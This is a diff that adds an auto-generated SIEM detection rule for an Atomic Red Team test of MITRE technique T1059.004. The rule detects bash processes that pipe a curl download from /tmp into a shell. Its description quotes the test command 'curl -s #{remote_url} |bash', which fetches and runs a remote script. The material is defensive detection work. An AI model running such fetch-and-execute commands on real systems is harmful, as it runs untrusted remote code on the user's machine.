@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Detecting pipe-to-shell' (GUID: fca246a8-a585-4f28-a2df-6495973976a1) of technique T1059.004 (Command and Scripting Interpreter: Bash). Test Description: An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.. Command/Steps: cd /tmp\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt      \n"
+from = "now-9m"
+rule_id = "b9b6e2cf-4cec-4a59-b766-2a2ccf7af856"
+language = "kql"
+name = "Atomic Test: T1059.004 - Detecting pipe-to-shell"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1059.004/T1059.004.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1059.004", "fca246a8-a585-4f28-a2df-6495973976a1", "linux",]
+type = "query"
+query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*/tmp*\\\" AND process.command_line : \\\"*curl*\\\" AND process.command_line : \\\"*|bash*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1059.004"
+name = "Detecting pipe-to-shell"
+reference = "https://attack.mitre.org/techniques/T1059/004"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1059/004"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1059/004"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1059/004"
+
+
